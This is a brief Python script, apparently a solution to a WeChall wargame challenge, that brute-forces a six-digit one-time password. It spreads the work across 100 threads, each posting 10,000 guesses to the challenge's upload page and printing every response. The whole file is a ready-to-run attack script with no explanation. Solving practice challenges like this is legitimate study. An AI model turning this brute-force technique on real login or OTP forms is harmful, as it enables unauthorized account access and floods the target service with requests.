#!/usr/bin/env python3

import requests
from threading import Thread
import threading

url = 'http://www.wechall.net/challenge/Z/blackhattale/upload_asc.php'

def req(first, second):
    for i in range(10000):
        otp = first + second + '{:0>4}'.format(i)
        print(otp, requests.post(url, {
            'submit': 'submit',
            'otp': otp,
        }).text)

if __name__ == '__main__':
    threads = []
    for i in range(10):
        for j in range(10):
            threads.append(Thread(target=req, args=(str(i), str(j))))
    for t in threads: t.start()
    for t in threads: t.join()

